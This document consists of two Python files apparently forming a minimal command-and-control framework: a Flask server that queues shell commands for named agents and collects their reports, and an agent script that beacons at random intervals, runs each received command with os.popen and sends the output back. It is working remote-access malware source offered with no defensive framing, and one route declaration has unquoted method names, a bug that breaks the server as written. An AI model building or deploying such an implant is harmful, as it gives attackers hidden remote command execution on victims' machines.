# === server/c2.py ===
from flask import Flask, request, jsonify
import os, json

app = Flask(__name__)
DATA_DIR = "data"
if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

def get_task_file(agent_id):
    return os.path.join(DATA_DIR, f"{agent_id}_tasks.json")

def load_tasks(agent_id):
    path = get_task_file(agent_id)
    if os.path.exists(path):
        with open(path) as f:
            return json.load(f)
    return []

def save_tasks(agent_id, tasks):
    with open(get_task_file(agent_id), "w") as f:
        json.dump(tasks, f)

@app.route("/api/update/<agent_id>", methods=[POST, GET])
def update(agent_id):
    tasks = load_tasks(agent_id)
    save_tasks(agent_id, [])  # Clear tasks after sending
    return jsonify(tasks)

@app.route("/api/report", methods=["POST"])
def report():
    data = request.json
    agent_id = data.get("agent_id")
    result = data.get("result")
    if agent_id and result:
        print(f"[REPORT] {agent_id}:\n{result}")
        return "OK"
    return "ERROR", 400

@app.route("/api/queue/<agent_id>", methods=["POST"])
def queue_task(agent_id):
    task = request.json.get("task")
    if not task:
        return "Missing task", 400
    tasks = load_tasks(agent_id)
    tasks.append(task)
    save_tasks(agent_id, tasks)
    return "Task Queued"

if __name__ == "__main__":
    app.run(debug=False)


# === agents/lune_agent.py ===
import os
import time
import random
import requests
import json

AGENT_ID = "agent_001"
C2_URL = "http://localhost:5000"

def beacon():
    try:
        response = requests.get(f"{C2_URL}/api/update/{AGENT_ID}")
        if response.status_code == 200:
            return json.loads(response.text)
    except Exception as e:
        print(f"Beacon error: {e}")
    return []

def send_result(result):
    data = {"agent_id": AGENT_ID, "result": result}
    try:
        requests.post(f"{C2_URL}/api/report", json=data)
    except Exception as e:
        print(f"Send error: {e}")

def run_tasks(tasks):
    for cmd in tasks:
        try:
            output = os.popen(cmd).read()
        except Exception as e:
            output = str(e)
        send_result(output)

if __name__ == "__main__":
    while True:
        tasks = beacon()
        if tasks:
            run_tasks(tasks)
        time.sleep(random.randint(10, 30))
